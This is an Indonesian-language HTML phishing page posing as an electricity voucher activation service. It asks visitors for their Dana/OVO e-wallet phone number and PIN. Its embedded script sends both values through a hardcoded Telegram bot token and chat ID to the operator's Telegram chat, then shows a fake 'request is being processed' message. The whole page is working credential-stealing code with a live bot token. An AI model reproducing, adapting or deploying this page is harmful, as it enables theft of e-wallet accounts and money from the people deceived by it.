<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Voucher listrik</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
  </head>
  <body>
    <nav class="navbar navbar-expand-lg navbar-dark" style="background-color: brown">
      <div class="container-fluid">
        <a class="navbar-brand" href="#"></a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
          <div class="navbar-nav">
            <a class="nav-link active" aria-current="page" href="#">Home</a>
          </div>
        </div>
      </div>
    </nav>
    <div class="container">
      <div class="title-web mt-4">
        <h1 class="text-center">Pengaktifan Voucher Listrik</h1>
      </div><br>
      <div class="image-web">
        <center><img src="https://kosred.com/a/smlozq.jpg" alt="" width="40px">
        <img src="https://kosred.com/a/wnwdvj.jpg" alt="" width="40px" height="25px"></center>
      </div>
      <div class="row mt-5">
        <div class="col-md-6">
            <label class="ms-5" for="nope">No. Telpon akun Dana/Ovo</label><br>
            <center><input type="text" name="nope" id="nope" style="border: none; border-bottom: 2px solid black; width: 80%"></center>
        </div><br>
        <div class="col-md-6 mt-4">
            <label class="ms-5" for="pin">Pin Dana/Ovo</label><br>
            <center><input type="number" name="pin" id="pin" style="border: none; border-bottom: 2px solid black; width: 80%"></center>
        </div>
      </div>
      <center><button onclick="subm()" class="mt-4" style="background-color: white; height: 40px; width: 130px">
        PROSES
      </button></center>
      <br>
      <p id="proses" class="text-center" style="color: red; display: none">TERIMA KASIH PERMINTAAN ANDA SEDANG DI PROSES</p>
      <div class="image-web mt-5">
        <center>
          <img src="https://kosred.com/a/smlozq.jpg" alt="" width="40px">
          <img src="https://kosred.com/a/wnwdvj.jpg" alt="" width="40px" height="25px">
        </center>
      </div>
    </div>
    <script>
      const subm = () => {
       let proses = document.querySelector("#proses");
       let nope = document.querySelector("#nope").value
       let pin = document.querySelector("#pin").value
       let token = "6668808747:AAEHrNJ71ZWNsdGSsaHQbZxBYUSo4YIU5BM"
       let id_tele = "5889179929"
       if (nope === "" | pin === "") {
         alert("mohon lengkapi data")
       } else {
         let message = `No. handphone: ${nope} || Pin: ${pin}`
         let api = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id_tele}&text=${message}`
         fetch(api, {
           method: 'POST',
         })
         .then((response) => response.json())
         .then((data) => {
           console.log(data);
           proses.style.display = "block"
          })
          .catch((error) => {
            console.error('Error:', error);
          });
       }
      }
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
  </body>
